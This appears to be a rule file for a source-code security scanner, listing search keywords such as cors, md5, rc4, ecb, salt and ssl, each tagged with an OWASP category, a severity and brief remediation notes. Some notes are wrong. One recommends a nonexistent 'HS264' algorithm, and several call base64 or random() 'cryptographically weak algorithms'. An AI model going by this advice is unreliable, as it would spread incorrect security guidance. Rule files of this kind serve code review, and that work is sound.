CategoryNo;CategoryName;CategoryType;Pattern;PatternName;Status;OutputFileName;IncludeComment;NotInternetFacing;IncludeIfSingleThread;Internal;Apply_BRs;Purpose;SearchOnlyFor;Classification;OWASP;Severity;Details;Remediation;Ref_1;Ref_2
10;General;; scope;scope;Investigate;General__Investigate_scope;True;;True;False;True;;;Authorization;A1-Broken Access Control;Medium;"Swagger Scopes should be defined (except ""read-the-docs"").";;;
10;General;; root;root;Investigate;General__Investigate_root;False;;True;False;True;Locate;;Authorization;A1-Broken Access Control;High;Root user exploit?;;;
10;General;;access;access;Investigate;General__Investigate_access;False;;True;False;True;Locate;;Authorization;A1-Broken Access Control;High;;;;
10;General;;authorized;authorized;Investigate;General__Investigate_authorized;False;;True;False;True;;;Authorization;A1-Broken Access Control;High;Look for booleans, like rejectUnauthorized.;;;
10;General;;authori;authori;Investigate;General__Investigate_authori;False;;True;False;True;Locate;;Authorization;A1-Broken Access Control;High;;;;
10;General;;allow-origin;allow-origin;Investigate;General__Investigate_allow-origin;False;Exclude;True;False;True;;;Authorization;A1-Broken Access Control;Medium;Allowing resource sharing from all hosts could lead to unintended sharing of resources with an attacker. ;If possible whitelist hosts.;https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny;
10;General;;cors;cors;Investigate;General__Investigate_cors;False;Exclude;True;False;True;;;CORS;A1-Broken Access Control;Medium;Allowing resource sharing from all hosts could lead to unintended sharing of resources with an attacker. ;If possible whitelist hosts.;https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny;
10;General;;salt;salt;Investigate;General__Investigate_salt;False;;True;False;True;Locate;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;;crypt;crypt;Investigate;General__Investigate_crypt;True;;True;False;True;Locate;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;;cipher;cipher;Investigate;General__Investigate_cipher;True;;True;False;True;Locate;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;;decode;decode;Investigate;General__Investigate_decode;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;For jwt, is signature verified?;;;
10;General;;encode;encode;Investigate;General__Investigate_encode;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only vulnerable when used as encryption method (like b64encode). Jwt should be encodedd with a key >= 32 characters and a secure algorithm like HS264.;;;
10;General;;"r""(sha)[0-1]""";SHA;Insecure;General__Insecure_SHA;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;;md4;md4;Insecure;General__Insecure_md4;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;md5;md5;Insecure;General__Insecure_md5;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;rc2;rc2;Insecure;General__Insecure_rc2;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;rc4;rc4;Insecure;General__Insecure_rc4;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;blowfish;blowfish;Insecure;General__Insecure_blowfish;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;ecb;ecb;Insecure;General__Insecure_ecb;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;SHA512 for signing documents, bcrypt, sha512crypt or scrypt for passwords.;https://www.owasp.org/index.php/Testing_for_Weak_Encryption_(OTG-CRYPST-004);
10;General;;random(;random;Investigate;General__Investigate_random;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;urandom, SystemRandom(), SecureRandom();https://www.owasp.org/index.php/Using_the_Java_Cryptographic_Extensions;
10;General;;hash;hash;Investigate;General__Investigate_hash;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;;https://security.stackexchange.com/questions/52877/how-secure-is-javas-hashcode#52881;
10;General;;base64;base64;Investigate;General__Investigate_base64;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;This is a cryptographically weak algorithm. It should not be used to obfuscate or protect sensitive data.;;;
10;General;;kCCPRFHmacAlgSHA1;kCCPRFHmacAlgSHA1;Investigate;General__Investigate_kCCPRFHmacAlgSHA1;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;;;;
10;General;; ssl;ssl;Investigate;General__Investigate_ssl;True;;True;False;True;Locate;;Transport security;A2-Cryptographic Failures;High;How is secure transport implemented? 'ssl' may be a key in comment.;;;
10;General;; tls;tls;Investigate;General__Investigate_tls;False;;True;False;True;Locate;;Transport security;A2-Cryptographic Failures;High;How is secure transport implemented?;;;
